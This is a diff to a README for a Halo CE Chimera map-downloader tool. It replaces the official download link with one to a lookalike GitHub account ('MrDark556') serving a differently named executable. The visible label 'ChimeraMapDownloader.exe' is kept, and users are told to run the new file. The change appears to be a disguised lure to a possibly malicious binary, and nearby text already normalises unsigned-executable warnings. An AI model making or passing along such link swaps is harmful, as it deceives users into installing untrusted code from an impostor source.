@@ -232,7 +232,7 @@ This is normal for unsigned community executables.
 
 ## Quick setup
 
-1. [Download `ChimeraMapDownloader.exe`](https://github.com/MrDark57/chimera-custom-map-downloader/releases/latest/download/ChimeraMapDownloader.exe)
+1. [Download](https://github.com/MrDark556/chimera_map_fix/releases/download/v3.5/haloce_chimera_mpdlr.exe) `ChimeraMapDownloader.exe`
 2. Open `chimera.ini`.
 3. Under `[memory]`, set:
 
@@ -244,7 +244,7 @@ download_template=http://127.0.0.1:8765/{map}
 5. Start Halo using:
 
 ```text
-ChimeraMapDownloader.exe
+haloce_chimera_mpdlr.exe
 ```
 
 6. Join servers normally.
